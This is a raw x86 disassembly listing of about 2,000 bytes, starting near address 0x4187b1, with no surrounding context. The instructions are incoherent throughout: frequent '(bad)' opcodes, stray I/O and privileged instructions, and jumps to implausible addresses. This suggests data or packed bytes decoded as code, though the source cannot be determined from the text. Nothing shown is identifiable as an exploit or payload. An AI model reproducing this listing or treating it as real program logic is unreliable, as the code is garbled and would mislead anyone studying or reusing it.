  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
  418f41:	gs push ebp
  418f43:	add    ah,ch
  418f45:	into   
  418f46:	in     al,dx
  418f47:	enter  0xb756,0xf0
  418f4b:	push   cs
  418f4c:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  418f56:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  418f5c:	jnp    0x74421464
  418f62:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  418f68:	add    BYTE PTR [edi],cl
  418f6a:	mov    edi,DWORD PTR [ecx-0x78]
  418f6d:	ltr    WORD PTR [ecx-0x7b]
  418f71:	dec    DWORD PTR [edi]
  418f73:	clc    
  418f74:	out    0x45,eax
  418f76:	add    BYTE PTR [eax],cl
  418f78:	cmp    ebx,0xffffff8c
  418f7b:	jge    0x418f7d
  418f7d:	jb     0x418f8f
  418f7f:	je     0x508fff
  418f85:	pop    edx
  418f86:	push   esi
  418f87:	mov    ecx,DWORD PTR [edi]
  418f89:	in     al,dx
  418f8a:	rol    DWORD PTR [ebp+0x0],1
  418f8d:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  418f94:	cmp    DWORD PTR [ecx],0xfffffff0
  418f97:	hlt    
  418f98:	mov    esp,DWORD PTR [eax+0xf034d2b]
  418f9e:	(bad)  
  418fa0:	push   eax
  418fa1:	jns    0xb841741f
  418fa7:	lock push cs
  418fa9:	ror    edx,0x3
  418fac:	test   BYTE PTR [ecx+0x5500e800],cl
  418fb2:	dec    eax
  418fb3:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  418fb7:	(bad)  
  418fb8:	mov    esi,0x7f33ff5f
  418fbd:	inc    eax
  418fbe:	test   DWORD PTR [edx],eax
  418fc0:	je     0x418f82
  418fc2:	mov    ecx,ecx
  418fc4:	adc    DWORD PTR [ebp-0xc],0xffffffec
  418fc8:	and    eax,DWORD PTR [eax+0xf0103]
  418fce:	jp     0x418fbc
  418fd0:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  418fd4:	add    edx,DWORD PTR [edi+0x74]
  418fd7:	sbb    BYTE PTR [ebp+0x4d001484],cl
  418fdd:	add    BYTE PTR [ebp-0x74c48bbb],al
  418fe3:	je     0x418f68
  418fe5:	cmp    eax,edi
  418fe7:	js     0x41900c
  418fe9:	add    eax,0xeb0fc003
